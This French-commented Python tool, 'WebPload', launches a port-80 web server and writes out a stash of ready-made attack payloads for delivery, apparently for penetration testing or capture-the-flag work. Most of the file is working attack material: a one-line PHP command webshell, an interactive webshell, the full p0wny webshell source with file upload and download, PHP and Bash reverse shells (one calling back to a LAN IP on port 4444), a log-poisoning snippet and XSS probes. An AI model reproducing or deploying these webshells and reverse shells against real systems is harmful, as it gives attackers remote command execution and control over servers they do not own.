########################################################
###################### RESUME ##########################
########################################################


resume = "Serveur web automatisé avec répertoire temporaire de payloads prêts à l'emploi"
description = """WebPload est un module qui automatise entièrement la création et la gestion 
d'un serveur web Python temporaire pour héberger des payloads.
 
Fonctionnalités automatisées :
- Création et suppression automatique d'un serveur web Python sur le port 80
- Génération automatique d'un répertoire temporaire 'ploads' contenant les payloads
- Création automatique des fichiers de payloads prêts à l'emploi
- Nettoyage automatique du répertoire temporaire à la fermeture
 
Les payloads générés automatiquement incluent :
- Webshells PHP
- Reverse shells (PHP, Bash)
- Scripts XSS (JavaScript) 
- Pages HTML basiques
- Et plus encore...
 
Le serveur et les fichiers sont temporaires et sont automatiquement supprimés à la fermeture du module."""

pload = {
    "php": {
        "webshell_basic": "<?php system($_GET['cmd']); ?>",
        "webshell_interactif": """<?php if (!empty($_POST['cmd'])) $cmd = shell_exec($_POST['cmd']); ?><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Web Shell</title><style>*{box-sizing:border-box;}body{font-family:sans-serif;color:rgba(0,0,0,.75);}main{margin:auto;max-width:850px;}pre,input,button{padding:10px;border-radius:5px;background-color:#efefef;}label{display:block;}input{width:100%;background-color:#efefef;border:2px solid transparent;}input:focus{outline:none;background:transparent;border:2px solid #e6e6e6;}button{border:none;cursor:pointer;margin-left:5px;}button:hover{background-color:#e6e6e6;}.form-group{display:flex;padding:15px 0;}</style></head><body><main><h1>Web Shell</h1><h2>Execute a command</h2><form method="post"><label for="cmd"><strong>Command</strong></label><div class="form-group"><input type="text" name="cmd" id="cmd" value="<?=htmlspecialchars($_POST['cmd'],ENT_QUOTES,'UTF-8')?>" onfocus="this.setSelectionRange(this.value.length,this.value.length);" autofocus required><button type="submit">Execute</button></div></form><?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?><h2>Output</h2><?php if (isset($cmd)): ?><pre><?=htmlspecialchars($cmd,ENT_QUOTES,'UTF-8')?></pre><?php else: ?><pre><small>No result.</small></pre><?php endif; ?><?php endif; ?></main></body></html>""",
        "p0wny-webshell":"""<?php $SHELL_CONFIG=array('username'=>'p0wny','hostname'=>'shell');function expandPath($p){if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#",$p,$m)){exec("echo $m[1]",$o);return$o[0].$m[2];}return$p;}function allFunctionExist($l=array()){foreach($l as$e){if(!function_exists($e))return false;}return true;}function executeCommand($c){$o='';if(function_exists('exec')){exec($c,$o);$o=implode("\\n",$o);}else if(function_exists('shell_exec'))$o=shell_exec($c);else if(allFunctionExist(array('system','ob_start','ob_get_contents','ob_end_clean'))){ob_start();system($c);$o=ob_get_contents();ob_end_clean();}else if(allFunctionExist(array('passthru','ob_start','ob_get_contents','ob_end_clean'))){ob_start();passthru($c);$o=ob_get_contents();ob_end_clean();}else if(allFunctionExist(array('popen','feof','fread','pclose'))){$h=popen($c,'r');while(!feof($h))$o.=fread($h,4096);pclose($h);}else if(allFunctionExist(array('proc_open','stream_get_contents','proc_close'))){$h=proc_open($c,array(0=>array('pipe','r'),1=>array('pipe','w')),$p);$o=stream_get_contents($p[1]);proc_close($h);}return$o;}function isRunningWindows(){return stripos(PHP_OS,"WIN")===0;}function featureShell($c,$w){$o="";if(preg_match("/^\\s*cd\\s*(2>&1)?$/",$c))chdir(expandPath("~"));else if(preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?$/",$c)){chdir($w);preg_match("/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/",$c,$m);chdir(expandPath($m[1]));}else if(preg_match("/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/",$c)){chdir($w);preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/",$c,$m);return featureDownload($m[1]);}else{chdir($w);$o=executeCommand($c);}return array("stdout"=>base64_encode($o),"cwd"=>base64_encode(getcwd()));}function featurePwd(){return array("cwd"=>base64_encode(getcwd()));}function featureHint($f,$w,$t){chdir($w);$c=$t=='cmd'?"compgen -c $f":"compgen -f $f";$c="/bin/bash -c \\"$c\\"";$fs=explode("\\n",shell_exec($c));foreach($fs as&$fn)$fn=base64_encode($fn);return array('files'=>$fs);}function featureDownload($p){$f=@file_get_contents($p);return$f===FALSE?array('stdout'=>base64_encode('File not found / no read permission.'),'cwd'=>base64_encode(getcwd())):array('name'=>base64_encode(basename($p)),'file'=>base64_encode($f));}function featureUpload($p,$f,$w){chdir($w);$h=@fopen($p,'wb');if($h===FALSE)return array('stdout'=>base64_encode('Invalid path / no write permission.'),'cwd'=>base64_encode(getcwd()));fwrite($h,base64_decode($f));fclose($h);return array('stdout'=>base64_encode('Done.'),'cwd'=>base64_encode(getcwd()));}function initShellConfig(){global$SHELL_CONFIG;if(isRunningWindows()){$u=getenv('USERNAME');if($u!==false)$SHELL_CONFIG['username']=$u;}else{$p=posix_getpwuid(posix_geteuid());if($p!==false)$SHELL_CONFIG['username']=$p['name'];}$h=gethostname();if($h!==false)$SHELL_CONFIG['hostname']=$h;}if(isset($_GET["feature"])){$r=NULL;switch($_GET["feature"]){case"shell":$c=$_POST['cmd'];if(!preg_match('/2>/',$c))$c.=' 2>&1';$r=featureShell($c,$_POST["cwd"]);break;case"pwd":$r=featurePwd();break;case"hint":$r=featureHint($_POST['filename'],$_POST['cwd'],$_POST['type']);break;case'upload':$r=featureUpload($_POST['path'],$_POST['file'],$_POST['cwd']);}header("Content-Type: application/json");echo json_encode($r);die();}else{initShellConfig();}?><!DOCTYPE html><html><head><meta charset="UTF-8"/><title>p0wny@shell:~#</title><meta name="viewport"content="width=device-width,initial-scale=1.0"/><style>html,body{margin:0;padding:0;background:#333;color:#eee;font-family:monospace;width:100vw;height:100vh;overflow:hidden}*::-webkit-scrollbar-track{border-radius:8px;background-color:#353535}*::-webkit-scrollbar{width:8px;height:8px}*::-webkit-scrollbar-thumb{border-radius:8px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#bcbcbc}#shell{background:#222;box-shadow:0 0 5px rgba(0,0,0,.3);font-size:10pt;display:flex;flex-direction:column;align-items:stretch;max-width:calc(100vw - 2 * var(--shell-margin));max-height:calc(100vh - 2 * var(--shell-margin));resize:both;overflow:hidden;width:100%;height:100%;margin:var(--shell-margin)auto}#shell-content{overflow:auto;padding:5px;white-space:pre-wrap;flex-grow:1}#shell-logo{font-weight:bold;color:#FF4180;text-align:center}:root{--shell-margin:25px}@media(min-width:1200px){:root{--shell-margin:50px!important}}@media(max-width:991px),(max-height:600px){#shell-logo{font-size:6px;margin:-25px 0}:root{--shell-margin:0!important}#shell{resize:none}}@media(max-width:767px){#shell-input{flex-direction:column}}@media(max-width:320px){#shell-logo{font-size:5px}}.shell-prompt{font-weight:bold;color:#75DF0B}.shell-prompt>span{color:#1BC9E7}#shell-input{display:flex;box-shadow:0 -1px 0 rgba(0,0,0,.3);border-top:rgba(255,255,255,.05)solid 1px;padding:10px 0}#shell-input>label{flex-grow:0;display:block;padding:0 5px;height:30px;line-height:30px}#shell-input #shell-cmd{height:30px;line-height:30px;border:none;background:transparent;color:#eee;font-family:monospace;font-size:10pt;width:100%;align-self:center;box-sizing:border-box}#shell-input div{flex-grow:1;align-items:stretch}#shell-input input{outline:none}</style><script>var SHELL_CONFIG=<?php echo json_encode($SHELL_CONFIG);?>;var CWD=null;var commandHistory=[];var historyPosition=0;var eShellCmdInput=null;var eShellContent=null;function _insertCommand(c){eShellContent.innerHTML+="\\n\\n";eShellContent.innerHTML+='<span class=\\"shell-prompt\\">'+genPrompt(CWD)+'</span> ';eShellContent.innerHTML+=escapeHtml(c);eShellContent.innerHTML+="\\n";eShellContent.scrollTop=eShellContent.scrollHeight}function _insertStdout(s){eShellContent.innerHTML+=escapeHtml(s);eShellContent.scrollTop=eShellContent.scrollHeight}function _defer(c){setTimeout(c,0)}function featureShell(c){_insertCommand(c);if(/^\\s*upload\\s+[^\\s]+\\s*$/.test(c)){featureUpload(c.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1])}else if(/^\\s*clear\\s*$/.test(c)){eShellContent.innerHTML=''}else{makeRequest("?feature=shell",{cmd:c,cwd:CWD},function(r){if(r.hasOwnProperty('file')){featureDownload(atob(r.name),r.file)}else{_insertStdout(atob(r.stdout));updateCwd(atob(r.cwd))}})}}function featureHint(){if(eShellCmdInput.value.trim().length===0)return;function _requestCallback(d){if(d.files.length<=1)return;d.files=d.files.map(function(f){return atob(f)});if(d.files.length===2){if(type==='cmd'){eShellCmdInput.value=d.files[0]}else{var currentValue=eShellCmdInput.value;eShellCmdInput.value=currentValue.replace(/([^\\s]*)$/,d.files[0])}}else{_insertCommand(eShellCmdInput.value);_insertStdout(d.files.join("\\n"))}}var currentCmd=eShellCmdInput.value.split(" ");var type=(currentCmd.length===1)?"cmd":"file";var fileName=(type==="cmd")?currentCmd[0]:currentCmd[currentCmd.length-1];makeRequest("?feature=hint",{filename:fileName,cwd:CWD,type:type},_requestCallback)}function featureDownload(n,f){var e=document.createElement('a');e.setAttribute('href','data:application/octet-stream;base64,'+f);e.setAttribute('download',n);e.style.display='none';document.body.appendChild(e);e.click();document.body.removeChild(e);_insertStdout('Done.')}function featureUpload(p){var e=document.createElement('input');e.setAttribute('type','file');e.style.display='none';document.body.appendChild(e);e.addEventListener('change',function(){var promise=getBase64(e.files[0]);promise.then(function(f){makeRequest('?feature=upload',{path:p,file:f,cwd:CWD},function(r){_insertStdout(atob(r.stdout));updateCwd(atob(r.cwd))})},function(){_insertStdout('An unknown client-side error occurred.')})});e.click();document.body.removeChild(e)}function getBase64(f,o){return new Promise(function(r,j){var reader=new FileReader();reader.onload=function(){r(reader.result.match(/base64,(.*)$/)[1])};reader.onerror=j;reader.readAsDataURL(f)})}function genPrompt(c){c=c||"~";var s=c;if(c.split("/").length>3){var sp=c.split("/");s="…/"+sp[sp.length-2]+"/"+sp[sp.length-1]}return SHELL_CONFIG["username"]+"@"+SHELL_CONFIG["hostname"]+":<span title=\\""+c+"\\">"+s+"</span>#"}function updateCwd(c){if(c){CWD=c;_updatePrompt();return}makeRequest("?feature=pwd",{},function(r){CWD=atob(r.cwd);_updatePrompt()})}function escapeHtml(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}function _updatePrompt(){var e=document.getElementById("shell-prompt");e.innerHTML=genPrompt(CWD)}function _onShellCmdKeyDown(e){switch(e.key){case"Enter":featureShell(eShellCmdInput.value);insertToHistory(eShellCmdInput.value);eShellCmdInput.value="";break;case"ArrowUp":if(historyPosition>0){historyPosition--;eShellCmdInput.blur();eShellCmdInput.value=commandHistory[historyPosition];_defer(function(){eShellCmdInput.focus()})}break;case"ArrowDown":if(historyPosition>=commandHistory.length)break;historyPosition++;if(historyPosition===commandHistory.length){eShellCmdInput.value=""}else{eShellCmdInput.blur();eShellCmdInput.focus();eShellCmdInput.value=commandHistory[historyPosition]}break;case'Tab':e.preventDefault();featureHint();break}}function insertToHistory(c){commandHistory.push(c);historyPosition=commandHistory.length}function makeRequest(u,p,c){function getQueryString(){var a=[];for(var k in p)if(p.hasOwnProperty(k))a.push(encodeURIComponent(k)+"="+encodeURIComponent(p[k]));return a.join("&")}var x=new XMLHttpRequest();x.open("POST",u,true);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");x.onreadystatechange=function(){if(x.readyState===4&&x.status===200){try{var r=JSON.parse(x.responseText);c(r)}catch(e){alert("Error while parsing response: "+e)}}};x.send(getQueryString())}document.onclick=function(e){e=e||window.event;var s=window.getSelection();var t=e.target||e.srcElement;if(t.tagName==="SELECT")return;if(!s.toString())eShellCmdInput.focus()};window.onload=function(){eShellCmdInput=document.getElementById("shell-cmd");eShellContent=document.getElementById("shell-content");updateCwd();eShellCmdInput.focus()};</script></head><body><div id="shell"><pre id="shell-content"><div id="shell-logo">
        ___                         ____      _          _ _        _  _   
 _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ 
| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|
| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|
| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  
|_|                         |___/  \\____/                                  
</div></pre><div id="shell-input"><label for="shell-cmd"id="shell-prompt"class="shell-prompt">???</label><div><input id="shell-cmd"name="cmd"onkeydown="_onShellCmdKeyDown(event)"/></div></div></div></body></html>""",
        "reverse_shell": "php -r '$sock=fsockopen(\"'.gethostbyname(gethostname()).'\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "logger": "<?php file_put_contents('/var/log/apache2/access.log', $_GET['cmd']); ?>"
    },

    "js": {
        "xss_script": "<script>alert('XSS');</script>",
        "xss_iframe": "<iframe src=javascript:alert('XSS')></iframe>",
        "xss_img": "<img src=x onerror=alert('XSS')>"
    },

    "html": {
        "Hello_world": "<html><body><h1>Hello World !\nWebPload Open !</h1></body></html>",
        "webshell_php": "<html><?php system($_GET['cmd']); ?></html>"
    },
    
    "bash": {
        "reverse_shell": "bash -i >& /dev/tcp/192.168.1.28/4444 0>&1"
    }

}

########################################################
###################### IMPORTS ########################
########################################################    


import os
import socket
import subprocess
import shutil
from colorama import Fore, Style



########################################################
###################### Fonctions #####################
########################################################    


def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def main():
    
    # Vérifie si un serveur web python ou php est actif
    server_active = False
    server_type = None
    for proc in os.popen('ps aux'):
        if 'python -m http.server 80' in proc:
            server_active = True
            server_type = "python"
            break
        elif 'php -S 0.0.0.0:80' in proc:
            server_active = True 
            server_type = "php"
            break
    
    if server_active:
        # Si il y a un serveur web : demande a l'utilisateur si il veux fermer le WebPload
        close_server = input(Fore.LIGHTRED_EX + f"Un serveur web {server_type} est actif. Voulez-vous fermer le WebPload? (o/N): " + Style.RESET_ALL)
        if close_server.lower() in ['o', 'oui', 'yes', 'y']:
            print(Fore.LIGHTRED_EX + "Fermeture du serveur web..." + Style.RESET_ALL)
            if server_type == "python":
                os.system("pkill -f 'python -m http.server 80'")
            else:
                os.system("pkill -f 'php -S 0.0.0.0:80'")
            if os.path.exists(os.path.dirname(__file__)+'/ploads'):
                shutil.rmtree(os.path.dirname(__file__)+'/ploads')
    else:
        # Si non vérifie si le port 80 est libre
        if not is_port_in_use(80):
            # Si il n'y a pas de serveur web et que le port 80 est libre : demande a l'utilisateur si il veux ouvrir un WebPload
            open_server = input(Fore.LIGHTGREEN_EX + "Le port 80 est libre. Voulez-vous ouvrir un WebPload? (o/N): " + Style.RESET_ALL)
            if open_server.lower() in ['o', 'oui', 'yes', 'y']:
                # Demande le type de serveur
                server_choice = input(Fore.LIGHTGREEN_EX + "Quel type de serveur souhaitez-vous? (php/python - py) [" + Fore.YELLOW + "php" + Fore.LIGHTGREEN_EX + "]: " + Style.RESET_ALL).lower()
                if server_choice not in ['python', 'py']:
                    server_choice = 'php'
                
                ip_lan = subprocess.check_output("ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'", shell=True).decode().strip()
                print(Fore.LIGHTGREEN_EX + f"Ouverture du serveur web {server_choice}... Disponible sur : http://{ip_lan}" + Style.RESET_ALL)
                
                # Vérifie si le repertoire ploads existe dans le repertoire du fichier
                if os.path.exists(os.path.dirname(__file__)+'/ploads'):
                    # Si il existe, supprimer le repertoire
                    shutil.rmtree(os.path.dirname(__file__)+'/ploads')
                # Créer le repertoire
                os.makedirs(os.path.dirname(__file__)+'/ploads')

                # Créer dans le repertoire les fichiers contenant les payloads du dictionnaire dans le bon format
                for key, value in pload.items():
                    # Créer le répertoire pour cette key s'il n'existe pas
                    key_dir = os.path.dirname(__file__)+'/ploads/'+key
                    if not os.path.exists(key_dir):
                        os.makedirs(key_dir)
                        
                    for payload_name, payload in value.items():
                        file_path = key_dir+'/'+payload_name+'.'+key
                        if not os.path.exists(file_path):
                            with open(file_path, 'w') as f:
                                f.write(payload)
                            # Définir les permissions 777 sur le fichier créé
                            os.chmod(file_path, 0o777)
                
                # Ouvre le serveur web choisi en silencieux sur le port 80
                if server_choice == 'php':
                    index_php = """<?php if (php_sapi_name() === 'cli-server') {$url = parse_url($_SERVER['REQUEST_URI']); $file = $_SERVER['DOCUMENT_ROOT'] . $url['path']; if (is_file($file) && basename($file) !== 'index.php') {header('Content-Type: text/plain'); readfile($file); exit();}} ?><!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>WebPload</title><style>body{font-family:Arial,sans-serif;background:#121212;color:#e0e0e0;margin:0;padding:0;font-size:18px;}.container{max-width:1000px;margin:15px auto;background:#1e1e1e;padding:30px;border-radius:12px;box-shadow:0 6px 12px rgba(0,0,0,0.3);}h1{text-align:center;color:#bb86fc;font-size:50px;margin:10px 0 30px;}.breadcrumb{color:#888;margin-bottom:30px;font-size:20px;}.breadcrumb a{color:#00ccff;text-decoration:none;}.breadcrumb a:hover{color:#03dac6;}.search-container{display:flex;align-items:center;justify-content:space-between;margin-bottom:30px;gap:15px;}input[type="text"]{flex:1;padding:10px;border-radius:8px;border:1px solid #333;background:#2c2c2c;color:#e0e0e0;font-size:18px;}ul{list-style:none;padding:0;}li{padding:12px;border-bottom:1px solid #333;font-size:20px;}li a{text-decoration:none;}li a.file{color:#ff9900;}li a.directory{color:#00ccff;font-weight:bold;}li a:hover{color:#03dac6;}.home-btn,.search-btn{padding:10px 20px;background:#bb86fc;color:#121212;border-radius:8px;font-weight:bold;font-size:20px;border:none;cursor:pointer;}.home-btn:hover,.search-btn:hover{background:#e9b8ff;}</style></head><body><div class="container"><h1>WebPload</h1><?php $baseDir=__DIR__; $currentDir=isset($_GET['dir'])?realpath($baseDir.DIRECTORY_SEPARATOR.$_GET['dir']):$baseDir; $searchQuery=isset($_GET['search'])?strtolower($_GET['search']):''; if(strpos($currentDir,$baseDir)!==0)$currentDir=$baseDir; $relativePath=str_replace($baseDir,'',$currentDir); $pathParts=explode(DIRECTORY_SEPARATOR,trim($relativePath,DIRECTORY_SEPARATOR)); echo '<div class="breadcrumb">'; $path=''; foreach($pathParts as $part){if($part){$path.=DIRECTORY_SEPARATOR.$part; echo' / <a href="?dir='.urlencode(ltrim($path,DIRECTORY_SEPARATOR)).'">'.htmlspecialchars($part).'</a>';}} echo'</div>'; echo '<form method="get" action="" class="search-container">'; echo '<input type="hidden" name="dir" value="'.htmlspecialchars(trim($relativePath,DIRECTORY_SEPARATOR)).'">'; echo '<a href="?" class="home-btn">Home</a>'; echo '<input type="text" name="search" placeholder="Pload..." value="'.htmlspecialchars($searchQuery).'">'; echo '<button type="submit" class="search-btn">Recherche</button>'; echo'</form>'; function listFiles($dir,$baseDir,$searchQuery){$files=scandir($dir);$dirs=[];$normalFiles=[];foreach($files as $file){if($file!="."&&$file!=".."){$path=$dir.DIRECTORY_SEPARATOR.$file;$relativePath=str_replace($baseDir.DIRECTORY_SEPARATOR,'',$path);if(is_dir($path)){$dirs[]=['name'=>$file,'path'=>$relativePath];}else{if($file!=='index.php'){$normalFiles[]=['name'=>$file,'path'=>$relativePath];}}}}usort($dirs,fn($a,$b)=>strcasecmp($a['name'],$b['name']));usort($normalFiles,fn($a,$b)=>strcasecmp($a['name'],$b['name']));foreach($dirs as $dir){echo"<li><a class='directory' href='?dir=".htmlspecialchars($dir['path'])."'>".htmlspecialchars($dir['name'])."</a></li>";}foreach($normalFiles as $file){if($searchQuery===''||strpos(strtolower($file['name']),$searchQuery)!==false){echo"<li><a class='file' href='".htmlspecialchars($file['path'])."' target='_blank'>".htmlspecialchars($file['name'])."</a></li>";}}} function searchFilesRecursive($dir,$baseDir,$searchQuery){$results=[];$iterator=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));foreach($iterator as $file){if($file->isFile()&&$file->getFilename()!=='index.php'){$relativePath=str_replace($baseDir.DIRECTORY_SEPARATOR,'',$file->getPathname());if(strpos(strtolower($file->getFilename()),$searchQuery)!==false)$results[]=$relativePath;}}sort($results);foreach($results as $result){echo"<li><a class='file' href='".htmlspecialchars($result)."' target='_blank'>".htmlspecialchars($result)."</a></li>";}} echo'<ul>'; if($searchQuery){searchFilesRecursive($currentDir,$baseDir,$searchQuery);}else{listFiles($currentDir,$baseDir,$searchQuery);} echo'</ul>'; ?></div></body></html>"""

                    # Écriture du fichier index.php
                    with open(os.path.dirname(__file__)+'/ploads/index.php', 'w') as f:
                        f.write(index_php)
                    # Définir les permissions 777 sur le fichier index.php
                    #os.chmod(os.path.dirname(__file__)+'/ploads/index.php', 0o777)
                    # Démarrage du serveur PHP
                    subprocess.Popen(['php', '-S', '0.0.0.0:80', 'index.php'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=os.path.dirname(__file__)+'/ploads')
                else:
                    subprocess.Popen(['python', '-m', 'http.server', '80'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=os.path.dirname(__file__)+'/ploads')

        else:
            # Si il n'y a pas de serveur web et que le port 80 est occupé : affiche une erreur
            print(Fore.LIGHTRED_EX + "Erreur: Le port 80 est occupé." + Style.RESET_ALL)


if __name__ == "__main__":
    main()
